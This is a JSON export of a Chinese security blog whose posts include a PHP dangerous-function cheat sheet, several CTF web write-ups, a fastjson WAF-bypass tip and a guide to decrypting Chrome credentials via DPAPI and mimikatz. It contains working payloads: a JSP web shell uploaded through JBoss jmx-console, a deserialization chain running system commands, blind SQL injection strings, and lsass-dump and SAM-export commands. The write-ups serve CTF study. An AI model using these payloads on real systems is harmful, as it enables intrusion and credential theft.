{"meta":{"title":"白帽酱の博客","subtitle":"","description":"","author":"白帽酱","url":"https://rce.moe","root":"/"},"posts":[{"tags":[{"name":"笔记","slug":"笔记","permalink":"https://rce.moe/tags/%E7%AC%94%E8%AE%B0/"},{"name":"PHP","slug":"PHP","permalink":"https://rce.moe/tags/PHP/"}],"title":"PHP代码审计入门基础-PHP敏感函数速查表","date":"2021/10/27","text":"PHP敏感函数速查表最近正在写一个PHP代码审计的入门指南文档. 如果表格内出现遗漏或错误,欢迎大家私信反馈. PHP一些容易出现安全问题的函数方法命令执行一些常见的可以执行系统命令的函数/语法 函数/语法 描述 例子 system 执行命令并输出结果 system(‘id’); exec 执行命令 只可获取最后一行结果 exec(‘id’,$a); print_r($a); passthru 同 system passthru(‘id’); shell_exec ` (反引号) 执行命令并返回结果 $a=shell_exec(‘id’);print_r($a); $a=`id`;print_r($a); popen 执行命令并建立管道 返回一个指针 使用fread等函数操作指针进行读写 $a=popen(“id”, “r”); echo fread($a, 2096); proc_open 同 popen (进程控制功能更强大) 见PHP手册 pcntl_exec 执行命令 只返回是否发生错误 pcntl_exec(‘id’); 代码注入/文件包含 函数/语法结构 描述 例子 eval 将传入的参数内容作为PHP代码执行 eval 不是函数 是一种语法结构 不能当做函数动态调用 eval(‘phpinfo();’); assert 将传入的参数内容作为PHP代码执行 版本在PHP7以下是函数 PHP7及以上为语法结构 assert(‘phpinfo();’); preg_replace 当preg_replace使用/e修饰符且原字符串可控时时 有可能执行php代码 echo preg_replace(“/e”,”{${PHPINFO()}}”,”123”); call_user_func 把第一个参数作为回调函数调用 需要两个参数都完全可控才可利用 只能传入一个参数调用 call_user_func(‘assert’, ‘phpinfo();’); call_user_func_array 同call_user_func 可传入一个数组带入多个参数调用函数 call_user_func_array (‘file_put_contents’, [‘1.txt’,’6666’]); create_function 根据传递的参数创建匿名函数，并为其返回唯一名称 利用需要第二个参数可控 且创建的函数被执行 $f = create_function(‘’,’system($_GET[123]);’); $f(); include 包含并运行指定文件 执行出错会抛出错误 include ‘vars.php’; (括号可有可无) require 同include 执行出错会抛出警告 require(‘somefile.php’); (括号可有可无) require_once 同require 但会检查之前是否已经包含该文件 确保不重复包含 include_once 同include 但会检查之前是否已经包含该文件 确保不重复包含 SQL/LDAP注入 函数/方法 备注 mysql_query odbc_exec mysqli_query mysql_db_query mysql_unbuffered_query mysqli::query用法$mysqli = new mysqli(“localhost”, “my_user”, “my_password”, “world”);$mysqli-&gt;query(); pg_query pg_query_params pg_send_query pg_send_query_params sqlsrv_query pdo::query$pdo=new PDO(“mysql:host=localhost;dbname=phpdemo”,”root”,”1234”); $pdo-&gt;query($sql);; PDO SQLite3::querySQLite3::exec$db = new SQLite3(‘mysqlitedb.db’); $db-&gt;query(‘SELECT bar FROM foo’); $db-&gt;exec(‘CREATE TABLE bar (bar STRING)’); $mongo = new mongoclient(); $data = $coll-&gt;find($data); https://wooyun.js.org/drops/Mongodb%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB.html $ld = ldap_connect(“localhost”);…. $lb = @ldap_bind($ld, “cn=test,dc=test,dc=com”, “test”); https://www.cnblogs.com/0nc3/p/12063436.html Db::query Thinkphp Db::execute Thinkphp 文件读取/SSRF 函数 描述 例子 file_get_contents 读入文件返回字符串 echo file_get_contents(“flag.txt”); echo file_get_contents(“https://www.bilibili.com/\"); curl_setopt curl_exec Curl访问url获取信息 function curl($url){ $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_exec($ch); curl_close($ch); } $url = $_GET[‘url’]; curl($url); https://www.php.net/manual/zh/function.curl-exec.php fsockopen 打开一个套接字连接(远程 tcp/udp raw) https://www.php.net/manual/zh/function.fsockopen.php readfile 读取一个文件，并写入到输出缓冲 同file_get_contents fopen/fread/fgets/fgetss /fgetc/fgetcsv/fpassthru/fscanf 打开文件或者 URL 读取文件流 $file = fopen(“test.txt”,”r”); echo fread($file,”1234”); fclose($file); file 把整个文件读入一个数组中 echo implode(‘’, file(‘https://www.bilibili.com/')); highlight_file/show_source 语法高亮一个文件 highlight_file(“1.php”); parse_ini_file 读取并解析一个ini配置文件 print_r(parse_ini_file(‘1.ini’)); simplexml_load_file 读取文件作为XML文档解析 文件上传/写入/其他 函数 描述 例子 file_put_contents 将一个字符串写入文件 file_put_contents(“1.txt”,”6666”); move_uploaded_file 将上传的临时文件移动到新的位置 move_uploaded_file($_FILES[“pictures”][“tmp_name”],”1.php”) rename 重命名文件/目录 rename($oldname, $newname); rmdir 删除目录 mkdir 创建目录 unlink 删除文件 copy 复制文件 copy($file, $newfile); fopen/fputs/fwrite 打开文件或者 URL https://www.php.net/manual/zh/function.fwrite.php link 创建文件硬链接 link($target, $link); symlink 创建符号链接(软链接) symlink($target, $link); tmpfile 创建一个临时文件 (在临时目录存放 随机文件名 返回句柄) $temp = tmpfile(); fwrite($temp, “123456”); fclose($temp); request()-&gt;file()-&gt;move()request()-&gt;file()-&gt;file() Thinkphp 文件上传 $file = request()-&gt;file($name);$file-&gt;move($filepath); extractTo 解压ZIP到目录 DOMDocument loadXML simplexml_import_dom 加载解析XML 有可能存在XXEE 漏洞 file_get_contents获取客户端输入内容 new DOMDocument()初始化XML解析器 loadXML($xmlfile)加载客户端输入的XML内容 simplexml_import_dom($dom)获取XML文档节点，如果成功则返回SimpleXMLElement对象，如果失败则返回FALSE。 &lt;?php $xmlfile=file_get_contents(‘php://input’); $dom=new DOMDocument(); $dom-&gt;loadXML($xmlfile); $xml=simplexml_import_dom($dom); $xxe=$xml-&gt;xxe; $str=”$xxe \\n”; echo $str; ?&gt; 来自 &lt;_https://xz.aliyun.com/t/6887_&gt; simplexml_load_string 加载解析XML字符串 有可能存在XXE 漏洞 $xml=simplexml_load_string($_REQUEST[‘xml’]); print_r($xml); simplexml_load_file 读取文件作为XML文档解析 有可能存在XXE 漏洞 unserialize 反序列化","permalink":"https://rce.moe/2021/10/27/PHPsuchabiao/","photos":[]},{"tags":[{"name":"CTF","slug":"CTF","permalink":"https://rce.moe/tags/CTF/"},{"name":"WRITEUP","slug":"WRITEUP","permalink":"https://rce.moe/tags/WRITEUP/"},{"name":"强网杯","slug":"强网杯","permalink":"https://rce.moe/tags/%E5%BC%BA%E7%BD%91%E6%9D%AF/"}],"title":"第五届强网杯全国网络安全挑战赛WEB-部分writeup-强网杯2021","date":"2021/06/14","text":"EASYWEB 控制台查看网络请求发现flies 访问47.104.137.239/files/c09358adff2ebfff2ef9b4fbacc4ac0b 下载hint.txt 拿到提示 Try to scan 35000-40000 ^_^.All tables are empty except for the table where the username and password are locatedTable: employee 根据提示通过端口扫描发现36842端口开放username存在sql注入 POST /account/login HTTP/1.1Host: 47.104.137.239:36842User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 35DNT: 1Connection: closeReferer: http://121.42.242.238:36842/account/loginCookie: ci_session=bo397pc9n0pd318uetdbl1r5rh33u3jbUpgrade-Insecure-Requests: 1username=admin*&amp;password=admin 拿到登陆账号密码admin 99f609527226e076d668668582ac4420登陆后台后台没有可以利用的地方 继续扫描目录 发现文件上传路由构造文件名绕过限制上传php文件 由于权限太低无法getflag (只有owner有权限 flag权限应该是0440) 需要root用户组继续查看监听端口发现有其他服务 通过上传的小马写入新的phpshell通过shell搭建隧道 访问web服务 发现是一个存在jmx-console未授权访问的jboss /jmx-console/HtmlAdaptor?action=invokeOpByName&amp;name=jboss.admin%3Aservice%3DDeploymentFileRepository&amp;methodName=store&amp;argType=java.lang.String&amp;arg0=August.war&amp;argType=java.lang.String&amp;&amp;arg1=shell1&amp;argType=java.lang.String&amp;arg2=.jsp&amp;argType=java.lang.String&amp;arg3=&lt;%25 if(\"023\".equals(request.getParameter(\"pwd\"))){java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"i\")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print(\"&lt;pre&gt;\");while((a=in.read(b))!=-1){out.println(new String(b));}out.print(\"&lt;/pre&gt;\");}%25&gt;&amp;argType=boolean&amp;arg4=True 写入一句话shell 成功getflag pop_master该题需要构造反序列化利用链 最终实现RCE由于该题目类数量巨大1W个 编写自动化脚本构造pop链 第一步将class.php.txt转化成AST(抽象语法树) 保存为json格式&lt;?phpini_set(“memory_limit”,”-1”);echo(json_encode(ast\\parse_file(“class.php”, $version=70)));构造比较简单A-&gt;B-&gt;C-&gt;…….-&gt;包含EVAL()的class function调用这里有几个坑 1.调用途中有参数污染(附加垃圾数据) 2.调用途中传参可能被清空 (传参被赋值未定义的变量)3.调用途中传参可能被修改 (直接赋值为垃圾数据)所以并不是找到调用链就可以完成工作 而是需要找到可以利用的调用链 自动化代码:PS:没有什么参考价值 只对该题可用 因为固定3种函数结构所以偷懒把参数写死了 初学py语言 第一次做AST树解析用这种笨方法) ## -*- coding: utf-8 -*-import jsonimport randomimport osimport stringwith open(\"12.json\") as f: line=f.readline() result=json.loads(line)print(len(result['children']))def asb(name,s,s1=''): ee = 0 for a in result['children']: for b in a['children']['stmts']['children']: if 'name' in b['children'].keys(): if (b['children']['name'] == 'gG1T5D'): ee = 0 #ee=1 if (b['children']['name'] == name): test(a) if(len(b['children']['stmts']['children'])==3): q = b['children']['stmts']['children'][1]['children'][0]['children']['cond']['children']['args']['children'][1] w = b['children']['stmts']['children'][random.randint(1,2)]['children'][0]['children']['cond']['children']['args']['children'][1]#随机分支 玄学构造 #print(s + q) #print(s + w) ran_str = ''.join(random.sample(string.ascii_letters, 8)) print('$'+ran_str+'=new '+a['children']['name']+'();') s11='$' + ran_str + '-&gt;' + a['children']['stmts']['children'][0]['children']['props']['children'][0]['children']['name'] + '=' #if s1!='': # asb(w, s +w+'--&gt;') # asb(q, s +q+'--&gt;') if ee!=1: asb(w,s,s11)# 分支函数1 #asb(q, s, s11)# 分支函数2 if ran_str == '': exit() print(s1 + '$' + ran_str+';') #asb(q, s +q+'--&gt;') else: if 'method' in b['children']['stmts']['children'][1]['children'].keys():# 没有分支 q = b['children']['stmts']['children'][1]['children']['method'] ran_str = ''.join(random.sample(string.ascii_letters, 8)) print('$' + ran_str + '=new ' + a['children']['name'] + '();') s11 = '$' + ran_str + '-&gt;' + a['children']['stmts']['children'][0]['children']['props']['children'][0]['children']['name'] + '=' #print(s + q) if ee != 1: asb(q, s, s11) if ran_str == '': exit() print(s1 + '$' + ran_str + ';')def test(d): #if name in {'Name','COiLxB'}: #print('nono') #exit() try: a=d['children']['stmts']['children'][1]['children']['params']['children'][0]['children']['name'] b=d['children']['stmts']['children'][1]['children']['stmts']['children'][0]['children']['stmts']['children'][0]['children']['var']['children']['name'] c=d['children']['stmts']['children'][1]['children']['stmts']['children'][0]['children']['stmts']['children'][0]['children']['expr']['children']['name'] if(a==b and b!=c and a!='DgiNa'): #判断赋值是否是用不存在的变量覆盖传参 print(a,b,c) print('no') asb('YYdqkf', 'YYdqkf' + '--&gt;')#重新搜索 os._exit(0) except: passasb('YYdqkf','YYdqkf'+'--&gt;') 编写脚本处理AST随机抽取一条构造链 检验是否正常执行(传参修改检测) 反复抽取得到可用的链ps:例图输出与下面代码无关 找不到成功的图了 &lt;?php此处省略3M大小的源class$a=new WK4tcG();$prXsQMfO=new WK4tcG();$DLcTtAga=new xaeGnG();$lcbgRpGI=new oAMzcx();$IatldcbW=new p38LCI();$nULgbaKw=new GbfW4c();$ASyQaYMV=new m2s3zO();$GMwztlCS=new PgSSqR();$MegPsOnX=new RLuIRL();$neJOwgfu=new WykBAC();$PNHChDce=new g6hgDh();$BzceWjKp=new HDaeRV();$YThMXwcb=new bREm3w();$xWVjhwmO=new D0aZh5();$BIbCvgZD=new T9NX4U();$prvhXPMW=new eWciOL();$NVHbgdzD=new TqWDlm();$mszgihWC=new XoFA87();$vDBkPwqO=new MU1ai5();$ZYHhsIid=new eHtdBF();$ZYHhsIid-&gt;V7XKdgi=new DNUWgV();$vDBkPwqO-&gt;zXEmp6T=$ZYHhsIid;$mszgihWC-&gt;z35pfqP=$vDBkPwqO;$NVHbgdzD-&gt;KGgGFnb=$mszgihWC;$prvhXPMW-&gt;D6qeYVK=$NVHbgdzD;$BIbCvgZD-&gt;UwQCEH2=$prvhXPMW;$xWVjhwmO-&gt;ST8sCZq=$BIbCvgZD;$YThMXwcb-&gt;pMgtiwK=$xWVjhwmO;$BzceWjKp-&gt;OO72gIu=$YThMXwcb;$PNHChDce-&gt;GYBlHLq=$BzceWjKp;$neJOwgfu-&gt;yWYNYcP=$PNHChDce;$MegPsOnX-&gt;dFy0Irz=$neJOwgfu;$GMwztlCS-&gt;Cs99EPC=$MegPsOnX;$ASyQaYMV-&gt;QidIkAq=$GMwztlCS;$nULgbaKw-&gt;gE4DrP9=$ASyQaYMV;$IatldcbW-&gt;OksedLV=$nULgbaKw;$lcbgRpGI-&gt;SUxaKsh=$IatldcbW;$DLcTtAga-&gt;u3832FP=$lcbgRpGI;$a-&gt;fBuH5Og=$DLcTtAga;//$a = $_GET['pop'];$b = $_GET['argv'];echo serialize($a);//$a = unserialize($a);//var_dump($a);$a-&gt;YYdqkf($b);?&gt; 生成序列化文本?pop=O:6:%22WK4tcG%22:1:{s:7:%22fBuH5Og%22;O:6:%22xaeGnG%22:1:{s:7:%22u3832FP%22;O:6:%22oAMzcx%22:1:{s:7:%22SUxaKsh%22;O:6:%22p38LCI%22:1:{s:7:%22OksedLV%22;O:6:%22GbfW4c%22:1:{s:7:%22gE4DrP9%22;O:6:%22m2s3zO%22:1:{s:7:%22QidIkAq%22;O:6:%22PgSSqR%22:1:{s:7:%22Cs99EPC%22;O:6:%22RLuIRL%22:1:{s:7:%22dFy0Irz%22;O:6:%22WykBAC%22:1:{s:7:%22yWYNYcP%22;O:6:%22g6hgDh%22:1:{s:7:%22GYBlHLq%22;O:6:%22HDaeRV%22:1:{s:7:%22OO72gIu%22;O:6:%22bREm3w%22:1:{s:7:%22pMgtiwK%22;O:6:%22D0aZh5%22:1:{s:7:%22ST8sCZq%22;O:6:%22T9NX4U%22:1:{s:7:%22UwQCEH2%22;O:6:%22eWciOL%22:1:{s:7:%22D6qeYVK%22;O:6:%22TqWDlm%22:1:{s:7:%22KGgGFnb%22;O:6:%22XoFA87%22:1:{s:7:%22z35pfqP%22;O:6:%22MU1ai5%22:1:{s:7:%22zXEmp6T%22;O:6:%22eHtdBF%22:1:{s:7:%22V7XKdgi%22;O:6:%22DNUWgV%22:1:{s:7:%22bieiHE3%22;N;}}}}}}}}}}}}}}}}}}}}&amp;argv=system(%27cat%20/flag%27);//访问即可getflag [强网先锋]寻宝需要两个KEY 来getflag KEY1 &lt;?phpheader('Content-type:text/html;charset=utf-8');highlight_file(__file__);function filter($string){ $filter_word = array('php','flag','index','KeY1lhv','source','key','eval','echo','\\$','\\(','\\.','num','html','\\/','\\,','\\'','0000000'); $filter_phrase= '/'.implode('|',$filter_word).'/'; return preg_replace($filter_phrase,'',$string); }if($ppp){ unset($ppp);}$ppp['number1'] = \"1\";$ppp['number2'] = \"1\";$ppp['nunber3'] = \"1\";$ppp['number4'] = '1';$ppp['number5'] = '1';extract($_POST);$num1 = filter($ppp['number1']); $num2 = filter($ppp['number2']); $num3 = filter($ppp['number3']); $num4 = filter($ppp['number4']);$num5 = filter($ppp['number5']); if(isset($num1) &amp;&amp; is_numeric($num1)){ die(\"非数字\");}else{ if($num1 &gt; 1024){ echo \"第一层\"; if(isset($num2) &amp;&amp; strlen($num2) &lt;= 4 &amp;&amp; intval($num2 + 1) &gt; 500000){ echo \"第二层\"; if(isset($num3) &amp;&amp; '4bf21cd' === substr(md5($num3),0,7)){ echo \"第三层\"; if(!($num4 &lt; 0)&amp;&amp;($num4 == 0)&amp;&amp;($num4 &lt;= 0)&amp;&amp;(strlen($num4) &gt; 6)&amp;&amp;(strlen($num4) &lt; 8)&amp;&amp;isset($num4) ){ echo \"第四层\"; if(!isset($num5)||(strlen($num5)==0)) die(\"no\"); $b=json_decode(@$num5); if($y = $b === NULL){ if($y === true){ echo \"第五层\"; include 'KeY1lhv.php'; echo $KEY1; } }else{ die(\"no\"); } }else{ die(\"no\"); } }else{ die(\"no\"); } }else{ die(\"no\"); } }else{ die(\"no111\"); }} number1 number2使用科学计数法number3 md5前缀碰撞number4 带负号的0值绕过number5 json {1}即为true成功拿到KEY1 Key2下载文件压缩包内有大量docx文件编写脚本提取docx正文文本 寻找带有KEY的文本找到KEY2KEY1 KEY2提交到网站 成功getflag","permalink":"https://rce.moe/2021/06/14/QWB-2021-WEB-WP/","photos":[]},{"tags":[{"name":"CTF","slug":"CTF","permalink":"https://rce.moe/tags/CTF/"},{"name":"WRITEUP","slug":"WRITEUP","permalink":"https://rce.moe/tags/WRITEUP/"}],"title":"2021年春秋杯网络安全联赛春季赛-CTF-GameContract-WriteUp","date":"2021/06/08","text":"今年春秋杯春秋杯出了一道智能合约杂项 从来没接触过ETH合约的CTF题 网上找了一堆文章做出来了这道题 这里详细写出解题过程以便学习ETH智能合约的调用 GameContract题目分析访问题目网站 要求使用ETH钱包地址注册 使用浏览器扩展metamask注册之(这也是为了方便后续对合约函数的调用)准备好 Rinkeby 测试网络的 ETH 用作手续费转入所注册后给的 ETH 地址中 (这是专门去问了下主办方才知道的 网页上没有写是什么测试网络 (ETH比较大的测试网络有4个) 注册后居然还看不到自己的ETH地址)看到如此大的价格波动 肯定是利用价格波动赚差价了到这里还不知道GETFLAG的条件 这是一个ETH合约题 所以我们转向ETH合约去看看合约代码写了什么使用测试网络区块链浏览器查看交易列表 发现了合约地址区块链浏览器自带的反编译工具 反编译合约代码审计源码发现一个疑似getflag的函数 (这里面还有一个坑 getflag函数名没有公开 询问主办方才给了函数名 在最后放出了合约的部分源码)需要使用 10*10^6 个币(1000W)兑换flag 初始有1W币之后就进行股票交易操作来满足题目要求了通过利用股票价格波动进行频繁买卖操作最终得到了1000W币 合约的调用下面是对合约函数的调用操作 (看到排行榜有个大佬几亿个币却不会兑换flag太可惜了)这里用到的工具是http://remix.ethereum.org/这是一个ETH合约开发调试工具 这里用来调用现有的链上合约打开网站右键新建一个文件 命名为*.sol 例如test.sol // SPDX-License-Identifier: GPL-3.0pragma solidity &gt;=0.7.0 &lt;0.9.0;/** * @title Storage * @dev Store &amp; retrieve value in a variable */contract TEST { function payForFlag() public{ }} 这里只用写出要调用的函数里面不需要写功能 比较像c语言的函数声明 但还有很大的区别 写完一定要ctrl+s保存并编译 function TEST123(uint256 TEST) public view returns (uint256){ } 这个是带传参和返回值的写法写完函数声明点击左侧Deploy &amp; run transactions环境选择 Injected Web3此时metamask扩展会弹出授权窗口 输入密码 授权要操作的ETH账号(这里是股票平台注册时填写的ETH地址所属的钱包账号 )授权成功后会显示钱包地址和ETH余额 (在发起合约交易一定要保证账户有充足的ETH用作手续费)这里不使用本地调试 而是调用链上合约所以只需要在At Address右侧填入合约地址0xec36a74b9d08e796662c032d61530d94061679ea点击At Address按钮 (如果按钮灰色 根据下面的报错提示 请检查合约地址是否正确 上面的步骤是否正确完成)最后一步展开点击操作按钮 在浏览器钱包弹出的窗口授权 即可调用合约通过钱包查看交易地址 在区块链浏览器查看交易状态 Status为Success即为调用成功在注册邮箱收取flag 本文首发于安全客 转载请注明来源","permalink":"https://rce.moe/2021/06/08/2021%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E6%98%A5%E5%AD%A3%E8%B5%9B-CTF-GameContract-WriteUp/","photos":[]},{"tags":[{"name":"笔记","slug":"笔记","permalink":"https://rce.moe/tags/%E7%AC%94%E8%AE%B0/"},{"name":"DPAPI","slug":"DPAPI","permalink":"https://rce.moe/tags/DPAPI/"},{"name":"CHROME","slug":"CHROME","permalink":"https://rce.moe/tags/CHROME/"},{"name":"mimikatz","slug":"mimikatz","permalink":"https://rce.moe/tags/mimikatz/"}],"title":"chrome 浏览器cookies&登陆凭据解密&Windows系统下DPAPI中的MasterKey获取","date":"2021/05/05","text":"谷歌浏览器cookies&amp;登陆凭据解密&amp;Windows系统下DPAPI中的MasterKey获取谷歌浏览器の加解密Chrome cookies 储存位置 “%localappdata%\\Google\\Chrome\\User Data\\Default\\Cookies”Chrome 登陆凭据 储存位置 “%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data” 谷歌浏览器使用了windows自带的DPAPI进行加解密操作 解密方法有两种 第一种方法 :直接以加密数据的用户身份调用DPAPI解密Mimikatzdpapi::chrome /in:”%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data” /unprotectps:如果没有目标加密文件的用户的权限 或者是想要解密机器上其他用户加密储存的信息这种方法就不能使用了 第二种方法 : 获取MasterKey脱机解密DPAPI加密的数据需要使用MasterKey解密如果可以拿到MasterKey的话就可直接解密数据Mimikatzdpapi::chrome /in:”%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data” /unprotect /masterkey:36af83d6e6a67e4f67e6f45ca0464a031946182b3e67d72ce9c08e22d7a720b5d2a768418291f28fb79c6def7b068f84955e764e87e36c6b0b666e05fb7eb9f4 拿masterkey的几种方法方法一 直接在目标机器运行Mimikatz提取privilege::debugsekurlsa::dpapi(需目标用户已登陆) 方法二 转储lsass.exe 进程从内存提取masterkey如果目标用户已经登陆 lsass进程的内存中会存在masterkey 转储之 使用Mimikatz提取procdump.exe -accepteula -ma lsass.exe 666.dmpsekurlsa::minidump lsass.dmpsekurlsa::dpapi 方法三 导出SAM注册表 提取user hash 解密masterkey文件需SYSTEM权限reg save HKLM\\SYSTEM SS.hivreg save HKLM\\SECURITY SE.hivm/u 值解密Masterkey文件mimikatz log “lsadump::secrets /system:SS.hiv /security:SE.hiv”拿到DPAPI_SYSTEM m/u 后半部分的值 (HASH)这种方法对应MASTERKEY位置在C:\\Windows\\System32\\Microsoft\\Protect\\S-1-5-18\\User(一个个文件试总会解密成功的 现在不知道怎么获取用户对应的GUIDmimikatz “dpapi::masterkey /in:C:\\Windows\\System32\\Microsoft\\Protect\\S-1-5-18\\User{GUID} /system:HASH”即可拿到masterkey 方法四 已知用户密码(或hash) 用户SID(masterkey路径) 拿到加密后的masterkey文件这是当时 volatility内存取证题遇到的问题 这里就随手记录下来了第一步获取用户密码(或hash)找到masterkey文件位置这种方法的文件位置在C:\\Users{username}\\AppData\\Roaming\\Microsoft\\Protect{SID}{GUID}dpapi::masterkey /in:C:\\Users\\Genga03\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-262715442-3761430816-2198621988-1001\\57935170-beab-4565-ba79-2b09570b95a6 /sid:S-1-5-21-262715442-3761430816-2198621988-1001 /password:vIg*q3x6GFa5aFBA /protected/password可以用/hash:密码hash代替(NTLM or SHA1)即可拿到masterkey 方法五 通过域管理员导出backup key 恢复Master key利用条件:目标机器加入域 要拿的是域用户的key 拿到域管理员权限lsadump::backupkeys /system:123.com /export (需要域管理员权限) 导出domain backup keydpapi::masterkey /in:”C:\\Users\\spotless.OFFENSE\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-2552734371-813931464-1050690807-1106\\3e90dd9e-f901-40a1-b691-84d7f647b8fe” /pvk:ntds_capi_0_d2685b31-402d-493b-8d12-5fe48ee26f5a.pvk即可拿到masterkey 参考 渗透技巧-获取Windows系统下DPAPI中的MasterKey howto-~-scheduled-tasks-credentials Reading DPAPI Encrypted Secrets with Mimikatz and C++ Operational Guidance for Offensive User DPAPI Abuse","permalink":"https://rce.moe/2021/05/05/chrome-%E6%B5%8F%E8%A7%88%E5%99%A8cookies-%E7%99%BB%E9%99%86%E5%87%AD%E6%8D%AE%E8%A7%A3%E5%AF%86-Windows%E7%B3%BB%E7%BB%9F%E4%B8%8BDPAPI%E4%B8%AD%E7%9A%84MasterKey%E8%8E%B7%E5%8F%96/","photos":[]},{"tags":[{"name":"笔记","slug":"笔记","permalink":"https://rce.moe/tags/%E7%AC%94%E8%AE%B0/"},{"name":"fastjson","slug":"fastjson","permalink":"https://rce.moe/tags/fastjson/"}],"title":"fastjson绕过WAF的TIPS","date":"2021/05/05","text":"fastjson绕WAFのTIPSfastjson对字符串转义处理の特性fast解析字符串支持\\u Unicode转义和 \\x HEX转义的字符串解码 (一般json仅支持Unicode转义 fastjson多了对十六进制转义的支持)例如 字符串 driverClassLoader Unicode转义 编码 \\uxxxx(json通用)\\u0064\\u0072\\u0069\\u0076\\u0065\\u0072\\u0043\\u006C\\u0061\\u0073\\u0073\\u004C\\u006F\\u0061\\u0064\\u0065\\u0072HEX转义编码 \\x** (fastjson only)\\x64\\x72\\x69\\x76\\x65\\x72\\x43\\x6C\\x61\\x73\\x73\\x4C\\x6F\\x61\\x64\\x65\\x72fastjson中两者可以混合使用例:\\x64\\u0072\\x0069\\u0076\\x65\\u0072\\x43\\x6C\\u0061\\u0073\\x73\\x4C\\x006F\\x61\\x64\\x65\\u0072使用CyberChef进行方便的编解码这种方法可以绕过一些字符串规则匹配的waf 除此之外playload也可以加入%08%09这种空白字符扰乱waf对json匹配解析","permalink":"https://rce.moe/2021/05/05/fastjson%E7%BB%95WAF-TIPS/","photos":[]},{"tags":[{"name":"CTF","slug":"CTF","permalink":"https://rce.moe/tags/CTF/"},{"name":"WRITEUP","slug":"WRITEUP","permalink":"https://rce.moe/tags/WRITEUP/"}],"title":"2020安恒DASCTF八月浪漫七夕战 ezrce Writeup","date":"2020/08/25","text":"早上有点事 差点忘了有比赛233 &lt;?phperror_reporting(0);show_source(__FILE__);$code=$_POST['code'];$_=array('a','b','c','d','e','f','g','h','i','j','k','m','n','l','o','p','q','r','s','t','u','v','w','x','y','z','@','\\~','\\^','\\[','\\]','\\&amp;','\\?','\\&lt;','\\&gt;','\\*','1','2','3','4','5','6','7','8','9','0');//This blacklist is so stupid.$blacklist = array_merge($_);foreach ($blacklist as $blacklisted) { if (preg_match ('/' . $blacklisted . '/im', $code)) { die('you are not smart'); }}eval(\"echo($code)\");?&gt; 题目过滤了全部字母和数字和部分位运算符 由http头X-Powered-By: PHP/7.3.21可知 服务器PHP版本为7.3.21 需要构造无字母数字的playload 虽然过滤了部分位运算符 但还是漏了一个| 或运算 利用或运算符构造playload 调用readfile函数 读取根目录flagplayload code=('````````'|'\u0012\u0005\u0001\u0004\u0006 \u0005')('/````'|'/\u0006 \u0001\u0007'));//bas64Y29kZT0oJ2BgYGBgYGBgJ3wnEgUBBAYJDAUnKSgnL2BgYGAnfCcvBgwBBycpKTsvLw==","permalink":"https://rce.moe/2020/08/25/GeekPwn-2020-%E4%BA%91%E4%B8%8A%E6%8C%91%E6%88%98%E8%B5%9B-cosplay-writeup/","photos":[]},{"tags":[{"name":"笔记","slug":"笔记","permalink":"https://rce.moe/tags/%E7%AC%94%E8%AE%B0/"}],"title":"记一次mysql盲注遇到的问题","date":"2020/08/15","text":"前几天我把一个CVE写成EXP的时候遇到了一个问题目标使用了直接拼接SQL语句的方法进行sql查询而且使用的是UPDATE方法sql_query(\"UPDATE users SET status = 'confirmed', editsecret = '' WHERE id IN (\" . implode(\", \", $_POST[conusr]) . \") AND status='pending'\");根据拼接的语句 我写出了这样的playload 准备读取数据库中用户表的密码hashconusr[]=1) and if(ascii(mid((select group_concat(passhash) from users),%s,1))=%s,sleep(1),0)#发现执行后报出错误1093 - You can't specify target table 'users' for update in FROM clause这里发生了一个非常巧的事情 刚好UPDATE操作的和要select操作的是同一张表MYSQL不允许更新一张表的条件来自于查询这张表解决方法:在外面再套一层selectUPDATE users SET status = 'confirmed', editsecret = '' WHERE id IN (1) and if(ascii(mid((select * from (select group_concat(passhash) from users)as a),1,1))=1,sleep(1),0)#","permalink":"https://rce.moe/2020/08/15/%E8%AE%B0%E4%B8%80%E6%AC%A1mysql%E7%9B%B2%E6%B3%A8%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/","photos":[]},{"tags":[{"name":"CTF","slug":"CTF","permalink":"https://rce.moe/tags/CTF/"},{"name":"WRITEUP","slug":"WRITEUP","permalink":"https://rce.moe/tags/WRITEUP/"}],"title":"GeekPwn 2020 云上挑战赛 cosplay! writeup","date":"2020/07/14","text":"学生党 业余挖洞 只会点web 第一次写writeup，不大会写，请多关照。 看到这个题目cosplay! 就先看了眼这道题 居然拿到了个一血 0.0尝试上传文件发现是通过COS(腾讯的对象云储存)上传文件var Bucket = ‘933kpwn-1253882285’;var Region = ‘ap-shanghai’; var cos = new COS({ getAuthorization: function (options, callback) { var url = '/GetTempKey?path=/upload'; var xhr = new XMLHttpRequest(); xhr.open('GET', url, true); xhr.onload = function (e) { try { var data = JSON.parse(e.target.responseText); var credentials = data.Credentials; } catch (e) { } if (!data || !credentials) return console.error('credentials invalid'); callback({ TmpSecretId: credentials.TmpSecretId, TmpSecretKey: credentials.TmpSecretKey, XCosSecurityToken: credentials.Token, ExpiredTime: data.ExpiredTime, }); }; xhr.send(); }}); 分析源码发现这个页面是在本地利用从服务器获取的临时密钥给上传参数签名的一般上传用的普通密钥 而且是在后端给请求做签名但是临时密钥如果存在权限控制不当(临时密钥生成的时候可以限制操作方法和范围) 也可以在密钥有效期内完全控制储存桶(这道题就是这种情况) 访问 /GetTempKey?path=/ 取得临时密钥和令牌(临时密钥生成的时候可以限制操作路径)根据腾讯COS的文档 使用临时密钥和令牌访问储存桶为了方便这里使用腾讯云官方提供的PHP SDK 来操作储存桶临时密钥没有操作限制 成功获取储存桶内所有的对象键列表发现 Flag键名为 f1L9@/flag.txt 